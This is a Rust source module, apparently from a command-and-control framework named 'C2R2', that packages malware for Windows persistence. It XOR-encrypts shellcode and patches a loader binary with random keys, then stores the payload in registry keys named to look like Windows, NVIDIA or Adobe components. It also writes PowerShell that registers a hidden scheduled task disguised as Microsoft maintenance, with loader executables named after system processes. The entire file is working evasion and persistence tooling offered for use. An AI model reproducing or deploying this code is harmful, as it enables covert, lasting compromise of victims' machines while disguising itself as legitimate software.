//! Loader patching and persistence deployment module
//!
//! This module provides functionality to:
//! - Patch loader binary with polymorphic XOR keys and registry paths
//! - Generate PowerShell scripts for scheduled task deployment
//! - Create registry entries for shellcode storage

use rand::Rng;
use std::path::Path;

// Magic markers for binary patching
const XOR_KEY_MARKER: &[u8] = b"C2R2_LOADER_XOR_KEY_PLACEHOLDER_";
const REGKEY_MARKER: &[u8] = b"C2R2_LOADER_REGKEY_PLACEHOLDER___";
const REGVAL_MARKER: &[u8] = b"C2R2_LOADER_REGVAL_PLACEHOLDER___";

/// Polymorphic registry key names that look legitimate
const LEGITIMATE_KEY_NAMES: &[&str] = &[
    "WindowsUpdateService",
    "SecurityHealthService",
    "OneDriveSyncClient",
    "EdgeUpdateHelper",
    "ChromeUpdateService",
    "AdobeAcrobatUpdate",
    "NVIDIADisplayDriver",
    "IntelGraphicsConfig",
    "MicrosoftTeamsCache",
    "DropboxSyncEngine",
];

/// Polymorphic registry value names
const LEGITIMATE_VALUE_NAMES: &[&str] = &[
    "Data",
    "Config",
    "Cache",
    "Settings",
    "State",
    "Preferences",
];

/// Scheduled task trigger types
#[derive(Debug, Clone, Copy)]
pub enum TaskTrigger {
    /// On user logon
    OnLogon,
    /// On system idle
    OnIdle,
    /// Daily at specific time (hour, minute)
    Daily(u8, u8),
}

/// Generate a random XOR key (32 bytes)
pub fn generate_polymorphic_xor_key() -> Vec<u8> {
    let mut rng = rand::thread_rng();
    (0..32).map(|_| rng.gen::<u8>()).collect()
}

/// Generate a random legitimate-looking registry key name
pub fn generate_registry_key_name() -> String {
    let mut rng = rand::thread_rng();
    let base = LEGITIMATE_KEY_NAMES[rng.gen_range(0..LEGITIMATE_KEY_NAMES.len())];
    // Add random suffix for uniqueness
    let suffix: u16 = rng.gen_range(100..999);
    format!("{}{}", base, suffix)
}

/// Generate a random registry value name
pub fn generate_registry_value_name() -> String {
    let mut rng = rand::thread_rng();
    LEGITIMATE_VALUE_NAMES[rng.gen_range(0..LEGITIMATE_VALUE_NAMES.len())].to_string()
}

/// Patch loader binary with polymorphic configuration
/// Returns the patched binary data
pub fn patch_loader_binary(
    loader_data: &[u8],
    xor_key: &[u8],
    reg_key_name: &str,
    reg_value_name: &str,
) -> Result<Vec<u8>, String> {
    let mut patched = loader_data.to_vec();

    // Patch XOR key
    if let Some(pos) = find_marker(&patched, XOR_KEY_MARKER) {
        if xor_key.len() != 32 {
            return Err("XOR key must be exactly 32 bytes".to_string());
        }
        let key_start = pos + XOR_KEY_MARKER.len();
        patched[key_start..key_start + 32].copy_from_slice(xor_key);
    } else {
        return Err("XOR key marker not found in loader binary".to_string());
    }

    // Patch registry key name
    if let Some(pos) = find_marker(&patched, REGKEY_MARKER) {
        let name_start = pos + REGKEY_MARKER.len();
        let max_len = 64; // Maximum registry key name length
        let name_bytes = reg_key_name.as_bytes();
        if name_bytes.len() >= max_len {
            return Err(format!(
                "Registry key name too long (max {} chars)",
                max_len - 1
            ));
        }
        // Clear existing name and write new one
        for i in 0..max_len {
            patched[name_start + i] = 0;
        }
        patched[name_start..name_start + name_bytes.len()].copy_from_slice(name_bytes);
    } else {
        return Err("Registry key marker not found in loader binary".to_string());
    }

    // Patch registry value name
    if let Some(pos) = find_marker(&patched, REGVAL_MARKER) {
        let val_start = pos + REGVAL_MARKER.len();
        let max_len = 32; // Maximum registry value name length
        let val_bytes = reg_value_name.as_bytes();
        if val_bytes.len() >= max_len {
            return Err(format!(
                "Registry value name too long (max {} chars)",
                max_len - 1
            ));
        }
        // Clear existing name and write new one
        for i in 0..max_len {
            patched[val_start + i] = 0;
        }
        patched[val_start..val_start + val_bytes.len()].copy_from_slice(val_bytes);
    } else {
        return Err("Registry value marker not found in loader binary".to_string());
    }

    Ok(patched)
}

/// Find a marker in binary data
fn find_marker(data: &[u8], marker: &[u8]) -> Option<usize> {
    data.windows(marker.len()).position(|w| w == marker)
}

/// XOR encrypt data
pub fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

/// Generate PowerShell script to write shellcode to registry
pub fn generate_registry_script(
    reg_key_name: &str,
    reg_value_name: &str,
    encrypted_shellcode: &[u8],
) -> String {
    // Convert shellcode to base64 for PowerShell
    let encoded = base64_encode(encrypted_shellcode);
    let base64_data = String::from_utf8(encoded).unwrap_or_default();

    format!(
        r#"# C2R2 Registry Shellcode Installer
# This script writes encrypted shellcode to the registry

$RegPath = "HKCU:\Software\{}"
$ValueName = "{}"

# Base64 encoded encrypted shellcode
$ShellcodeB64 = "{}"

# Decode shellcode
$ShellcodeBytes = [Convert]::FromBase64String($ShellcodeB64)

# Create registry key if not exists
if (-not (Test-Path $RegPath)) {{
    New-Item -Path $RegPath -Force | Out-Null
}}

# Write binary data to registry
Set-ItemProperty -Path $RegPath -Name $ValueName -Value $ShellcodeBytes -Type Binary

Write-Host "[+] Shellcode written to registry: $RegPath\$ValueName"
Write-Host "[+] Size: $($ShellcodeBytes.Length) bytes"
"#,
        reg_key_name, reg_value_name, base64_data
    )
}

/// Simple base64 encoding
fn base64_encode(data: &[u8]) -> Vec<u8> {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let mut result = Vec::with_capacity(data.len().div_ceil(3) * 4);

    for chunk in data.chunks(3) {
        let b0 = chunk[0] as usize;
        let b1 = chunk.get(1).copied().unwrap_or(0) as usize;
        let b2 = chunk.get(2).copied().unwrap_or(0) as usize;

        result.push(ALPHABET[b0 >> 2]);
        result.push(ALPHABET[((b0 & 0x03) << 4) | (b1 >> 4)]);

        if chunk.len() > 1 {
            result.push(ALPHABET[((b1 & 0x0f) << 2) | (b2 >> 6)]);
        } else {
            result.push(b'=');
        }

        if chunk.len() > 2 {
            result.push(ALPHABET[b2 & 0x3f]);
        } else {
            result.push(b'=');
        }
    }

    result
}

/// Generate PowerShell script to create scheduled task
pub fn generate_scheduled_task_script(
    task_name: &str,
    loader_path: &str,
    trigger: TaskTrigger,
) -> String {
    let trigger_xml = match trigger {
        TaskTrigger::OnLogon => r#"<LogonTrigger>
        <Enabled>true</Enabled>
      </LogonTrigger>"#
            .to_string(),
        TaskTrigger::OnIdle => r#"<IdleTrigger>
        <Enabled>true</Enabled>
      </IdleTrigger>"#
            .to_string(),
        TaskTrigger::Daily(hour, minute) => {
            format!(
                r#"<CalendarTrigger>
        <StartBoundary>2024-01-01T{:02}:{:02}:00</StartBoundary>
        <Enabled>true</Enabled>
        <ScheduleByDay>
          <DaysInterval>1</DaysInterval>
        </ScheduleByDay>
      </CalendarTrigger>"#,
                hour, minute
            )
        }
    };

    // Generate polymorphic task names that look legitimate
    let legitimate_names = [
        "Microsoft\\Windows\\WindowsUpdate\\Automatic App Update",
        "Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator",
        "Microsoft\\Windows\\Shell\\FamilySafetyMonitor",
        "Microsoft\\Windows\\Maintenance\\WinSAT",
        "Microsoft\\Office\\Office Automatic Updates",
    ];

    // Use provided task name or generate one
    let final_task_name = if task_name.is_empty() {
        let mut rng = rand::thread_rng();
        legitimate_names[rng.gen_range(0..legitimate_names.len())].to_string()
    } else {
        task_name.to_string()
    };

    format!(
        r#"# C2R2 Scheduled Task Installer
# Creates a scheduled task for loader persistence

$TaskName = "{}"
$LoaderPath = "{}"

# Task XML definition
$TaskXML = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows System Maintenance</Description>
  </RegistrationInfo>
  <Triggers>
    {}
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$LoaderPath</Command>
    </Exec>
  </Actions>
</Task>
"@

# Register the task
Register-ScheduledTask -Xml $TaskXML -TaskName $TaskName -Force

Write-Host "[+] Scheduled task created: $TaskName"
Write-Host "[+] Loader path: $LoaderPath"
"#,
        final_task_name, loader_path, trigger_xml
    )
}

/// Generate combined deployment script
pub fn generate_deployment_script(
    reg_key_name: &str,
    reg_value_name: &str,
    encrypted_shellcode: &[u8],
    loader_path: &str,
    task_name: &str,
    trigger: TaskTrigger,
) -> String {
    let registry_script =
        generate_registry_script(reg_key_name, reg_value_name, encrypted_shellcode);
    let task_script = generate_scheduled_task_script(task_name, loader_path, trigger);

    format!(
        r#"# C2R2 Full Deployment Script
# This script sets up registry-based persistence with scheduled task trigger

# ============================================================================
# STEP 1: Write encrypted shellcode to registry
# ============================================================================

{}

# ============================================================================
# STEP 2: Create scheduled task for persistence
# ============================================================================

{}

Write-Host ""
Write-Host "[+] Deployment complete!"
Write-Host "[+] The loader will execute on the configured trigger."
"#,
        registry_script, task_script
    )
}

/// Deploy loader persistence (generates all necessary files)
pub fn prepare_loader_deployment(
    loader_template_path: &Path,
    shellcode_path: &Path,
    output_dir: &Path,
    trigger: TaskTrigger,
) -> Result<DeploymentPackage, String> {
    use std::fs;

    // Read loader template
    let loader_data = fs::read(loader_template_path)
        .map_err(|e| format!("Failed to read loader template: {}", e))?;

    // Read shellcode
    let shellcode_data =
        fs::read(shellcode_path).map_err(|e| format!("Failed to read shellcode: {}", e))?;

    // Generate polymorphic configuration
    let xor_key = generate_polymorphic_xor_key();
    let reg_key_name = generate_registry_key_name();
    let reg_value_name = generate_registry_value_name();

    // Encrypt shellcode
    let encrypted_shellcode = xor_encrypt(&shellcode_data, &xor_key);

    // Patch loader binary
    let patched_loader =
        patch_loader_binary(&loader_data, &xor_key, &reg_key_name, &reg_value_name)?;

    // Create output directory
    fs::create_dir_all(output_dir)
        .map_err(|e| format!("Failed to create output directory: {}", e))?;

    // Generate random loader filename
    let mut rng = rand::thread_rng();
    let loader_names = [
        "RuntimeBroker",
        "SecurityHealthSystray",
        "OneDriveSetup",
        "MicrosoftEdgeUpdate",
        "GoogleUpdate",
    ];
    let loader_name = format!(
        "{}{}.exe",
        loader_names[rng.gen_range(0..loader_names.len())],
        rng.gen_range(100..999)
    );

    // Write patched loader
    let loader_output = output_dir.join(&loader_name);
    fs::write(&loader_output, &patched_loader)
        .map_err(|e| format!("Failed to write loader: {}", e))?;

    // Generate deployment script
    let loader_install_path = format!("%LOCALAPPDATA%\\Microsoft\\Windows\\{}", loader_name);
    let task_name = format!(
        "Microsoft\\Windows\\{}",
        loader_names[rng.gen_range(0..loader_names.len())]
    );

    let deploy_script = generate_deployment_script(
        &reg_key_name,
        &reg_value_name,
        &encrypted_shellcode,
        &loader_install_path,
        &task_name,
        trigger,
    );

    let script_output = output_dir.join("deploy.ps1");
    fs::write(&script_output, &deploy_script)
        .map_err(|e| format!("Failed to write deployment script: {}", e))?;

    Ok(DeploymentPackage {
        loader_path: loader_output,
        script_path: script_output,
        xor_key,
        reg_key_name,
        reg_value_name,
        encrypted_shellcode,
    })
}

/// Deployment package containing all generated files
pub struct DeploymentPackage {
    pub loader_path: std::path::PathBuf,
    pub script_path: std::path::PathBuf,
    pub xor_key: Vec<u8>,
    pub reg_key_name: String,
    pub reg_value_name: String,
    pub encrypted_shellcode: Vec<u8>,
}
